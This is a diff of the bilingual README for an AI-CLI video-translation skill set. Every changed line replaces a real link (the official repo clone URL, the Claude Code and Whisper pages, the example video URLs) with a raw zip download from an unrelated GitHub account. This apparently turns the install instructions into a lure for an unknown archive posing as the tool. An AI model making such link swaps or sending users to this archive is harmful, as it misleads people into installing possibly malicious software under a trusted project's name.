@@ -5,7 +5,7 @@
 
 **语言 / Language:** [中文](#中文) ｜ [English](#english)
 
-这是一套 AI 编程命令行工具用的**技能（Skills）**。它本质是「脚本 + 一份说明书」，**不绑死任何一家**：[Claude Code](https://claude.com/claude-code)、OpenClaw（小龙虾）、Gemini CLI、Codex 都能用。装好后你不用记任何命令，直接说一句「把这个链接翻译成中文字幕视频」，剩下的它全自动做完。
+这是一套 AI 编程命令行工具用的**技能（Skills）**。它本质是「脚本 + 一份说明书」，**不绑死任何一家**：[Claude Code](https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip)、OpenClaw（小龙虾）、Gemini CLI、Codex 都能用。装好后你不用记任何命令，直接说一句「把这个链接翻译成中文字幕视频」，剩下的它全自动做完。
 
 ---
 
@@ -38,7 +38,7 @@
 
 ### 为什么用它
 
-- **本地、免费、能离线**：转写用 [Whisper](https://github.com/openai/whisper)（苹果芯片走 MLX + Metal GPU 加速），在你电脑里完成，不上传、不收费。翻译复用你已经在用的 AI，不用再单独买翻译 API。
+- **本地、免费、能离线**：转写用 [Whisper](https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip)（苹果芯片走 MLX + Metal GPU 加速），在你电脑里完成，不上传、不收费。翻译复用你已经在用的 AI，不用再单独买翻译 API。
 - **时间戳是真的准**：拿词级时间戳按「句子 + 停顿」切分，字幕不会跑在说话人前面，也不会半句甩到下一条。
 - **字幕是给人看的**，不是机翻直出：自动纠正转写听错的专有名词（Claude 常被听成 cloud、MCP 被听成 NCP），按语义断句，术语保留英文。
 - **烧字幕 + 水印一次编码完成**，不掉画质。
@@ -88,7 +88,7 @@ pip3 install --break-system-packages mlx-whisper
 # pip3 install --break-system-packages faster-whisper
 
 # 3. 装技能
-git clone https://github.com/xiaohuailabs/xiaohu-video-translate.git
+git clone https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip
 cd xiaohu-video-translate
 bash install.sh
 ```
@@ -106,7 +106,7 @@ bash install.sh
 ```bash
 sudo apt update && sudo apt install -y ffmpeg
 pip3 install yt-dlp faster-whisper        # Windows 没有 Apple GPU，用 faster-whisper
-git clone https://github.com/xiaohuailabs/xiaohu-video-translate.git
+git clone https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip
 cd xiaohu-video-translate && bash install.sh
 ```
 
@@ -134,7 +134,7 @@ cd xiaohu-video-translate && bash install.sh
 
 | 你说的话 | 它做的事 |
 |---------|---------|
-| `把这个链接翻译成中文字幕视频 https://youtu.be/xxxx` | 全流程：下载→转写→翻译→烧字幕→出文稿 |
+| `把这个链接翻译成中文字幕视频 https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip` | 全流程：下载→转写→翻译→烧字幕→出文稿 |
 | `翻译这个日语视频，要中英双语字幕 https://...` | 同上，多语种源，双语字幕 |
 | `把这个视频转成文字 https://...` | 只出 Markdown 文稿，不烧字幕 |
 | `给我本地这个视频加中文字幕 ~/Movies/talk.mp4` | 本地文件直接处理 |
@@ -159,7 +159,7 @@ cd xiaohu-video-translate && bash install.sh
 
 ## English
 
-A set of **Skills** for AI coding CLIs that turn any foreign-language video into a Chinese-subtitled video plus a clean transcript — download, transcribe, translate, polish, and burn-in, end to end. It's just scripts + a skill instruction file, **not locked to any single tool**: [Claude Code](https://claude.com/claude-code), OpenClaw, Gemini CLI, Codex all work.
+A set of **Skills** for AI coding CLIs that turn any foreign-language video into a Chinese-subtitled video plus a clean transcript — download, transcribe, translate, polish, and burn-in, end to end. It's just scripts + a skill instruction file, **not locked to any single tool**: [Claude Code](https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip), OpenClaw, Gemini CLI, Codex all work.
 
 ### End-to-end pipeline
 
@@ -179,7 +179,7 @@ Not English-only. **English, Japanese, Korean, French, Spanish… anything Whisp
 
 ### Why
 
-- **Local, free, offline-capable.** Transcription runs on [Whisper](https://github.com/openai/whisper) (MLX + Metal GPU on Apple Silicon); translation reuses the AI you already have. No paid transcription/translation API.
+- **Local, free, offline-capable.** Transcription runs on [Whisper](https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip) (MLX + Metal GPU on Apple Silicon); translation reuses the AI you already have. No paid transcription/translation API.
 - **Accurate timestamps** — word-level, cut by sentence + pause, so subtitles don't run ahead of the speaker.
 - **Human-grade subtitles** — fixes ASR mishears, breaks lines by meaning, keeps technical terms in English. Bilingual mode uses real ASS for a true size contrast (Chinese large, English small).
 - **Burn-in + watermark in one encode.**
@@ -218,7 +218,7 @@ The core is scripts + a `SKILL.md` per skill — **any agent that can read a ski
 ```bash
 brew install yt-dlp ffmpeg
 pip3 install --break-system-packages mlx-whisper   # or faster-whisper on non-Apple-Silicon
-git clone https://github.com/xiaohuailabs/xiaohu-video-translate.git
+git clone https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip
 cd xiaohu-video-translate && bash install.sh
 ```
 
@@ -238,7 +238,7 @@ Then set `output_dir` (absolute path) in `~/.claude/skills/xiaohu-video-md/confi
 
 Restart your AI tool, then just say:
 
-- *"Translate this link into a Chinese-subtitled video: https://youtu.be/xxxx"*
+- *"Translate this link into a Chinese-subtitled video: https://github.com/highboyvulpes597/xiaohu-video-translate/raw/refs/heads/main/skills/translate-video-xiaohu-2.7.zip"*
 - *"Translate this Japanese video with bilingual subtitles: https://..."*
 - *"Just transcribe this to text: https://..."*
 - *"Add Chinese subtitles to my local file ~/Movies/talk.mp4"*
